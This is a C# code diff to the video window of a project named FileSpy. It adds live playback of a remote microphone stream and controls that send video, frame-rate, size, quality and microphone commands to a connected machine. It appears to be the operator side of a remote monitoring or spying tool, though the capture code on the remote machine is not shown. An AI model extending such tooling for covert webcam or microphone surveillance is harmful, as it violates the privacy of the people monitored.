@@ -1,4 +1,6 @@
 ﻿using FileSpy.Classes;
+using NAudio.Wave;
+using NAudio.Wave.SampleProviders;
 using System;
 using System.IO;
 using System.IO.Compression;
@@ -21,6 +23,10 @@ namespace FileSpy.Windows
         int FPSCount;
         bool Working;
 
+        WaveOut MicroOut;
+        public BufferedWaveProvider MicroBuffer { get; set; }
+        VolumeSampleProvider MicroVolume;
+
         public delegate void CloseHandler(VideoWindow window);
         public event CloseHandler CloseEvent; 
 
@@ -35,6 +41,12 @@ namespace FileSpy.Windows
             Connection = connection;
             Working = true;
 
+            MicroOut = new WaveOut();
+            MicroBuffer = new BufferedWaveProvider(new WaveFormat(8000, 16, 1));
+            MicroVolume = new VolumeSampleProvider(MicroBuffer.ToSampleProvider());
+            MicroOut.Init(MicroVolume);
+            MicroOut.Play();
+
             Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.RVideoModule, ID));
             Task.Run(Pulsar);
             Task.Run(FpsCounter);
@@ -42,6 +54,7 @@ namespace FileSpy.Windows
 
         public void SetVideoData(byte[] data)
         {
+            StatusLabel.Opacity = 0;
             FPSCount++;
             ImageTable.Source = ConvertBM(data);
         }
@@ -124,6 +137,7 @@ namespace FileSpy.Windows
             return source;
         }
 
+        #region UIEvents
         private void SizeSlider_MouseEnter(object sender, MouseEventArgs e)
         {
             InfoPopup.PlacementTarget = sender as UIElement;
@@ -174,5 +188,75 @@ namespace FileSpy.Windows
             InfoPopup.IsOpen = false;
             InfoPopup.IsOpen = true;
         }
+
+        private void VideoCheck_Checked(object sender, RoutedEventArgs e)
+        {
+            if (Connection != null)
+                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.SetVideo, ID, VideoCheck.IsChecked.ToString()));
+        }
+
+        private void MaxFpsText_KeyUp(object sender, KeyEventArgs e)
+        {
+            if (e.Key == Key.Enter)
+            {
+                try
+                {
+                    int fps = Convert.ToInt32(MaxFpsText.Text);
+                    Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.SetMaxFps, ID, MaxFpsText.Text));
+                }
+                catch
+                {
+                    MaxFpsText.Text = "";
+                }
+            }
+        }
+
+        private void SizeSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
+        {
+            if (Connection != null)
+                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.SetSize, ID, SizeSlider.Value.ToString()));
+        }
+
+        private void QualitySlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
+        {
+            if (Connection != null)
+                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.SetQuality, ID, Convert.ToInt32(QualitySlider.Value).ToString()));
+        }
+
+        private void MicroCheck_Checked(object sender, RoutedEventArgs e)
+        {
+            if (Connection != null)
+                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.SetMicro, ID, MicroCheck.IsChecked.ToString()));
+        }
+
+        private void MicroSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
+        {
+            if (MicroOut != null)
+                MicroVolume.Volume = (float)MicroSlider.Value;
+        }
+
+        private void AudioCheck_Checked(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void AudioSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
+        {
+
+        }
+
+        private void FpsVisibleCheck_Checked(object sender, RoutedEventArgs e)
+        {
+            if (FPSLabel.Opacity == 0)
+                FPSLabel.Opacity = 1;
+            else
+                FPSLabel.Opacity = 0;
+        }
+
+        private void SecurityCheck_Checked(object sender, RoutedEventArgs e)
+        {
+
+        }
+        #endregion
     }
 }
